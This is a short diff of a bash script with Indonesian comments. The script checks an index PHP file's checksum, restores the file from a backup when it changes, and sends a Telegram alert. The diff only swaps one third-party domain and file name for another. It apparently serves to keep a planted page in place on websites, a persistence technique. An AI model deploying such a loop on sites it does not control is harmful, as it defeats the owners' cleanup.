@@ -39,8 +39,8 @@ monitor_file() {
             # Jika checksum berbeda, kembalikan file index.php dari backup
             echo "Change, mengembalikan backup..."
             cp "$BACKUP_FILE" "$INDEX_FILE"
-            echo "https://operetta.com.ua/."
-            send_telegram_notification "https://operetta.com.ua/. File index.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
+            echo "https://starholidays.co.uk/."
+            send_telegram_notification "https://starholidays.co.uk//. File index-home-star.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
         fi
 
         # Tunggu 30 detik sebelum pengecekan selanjutnya
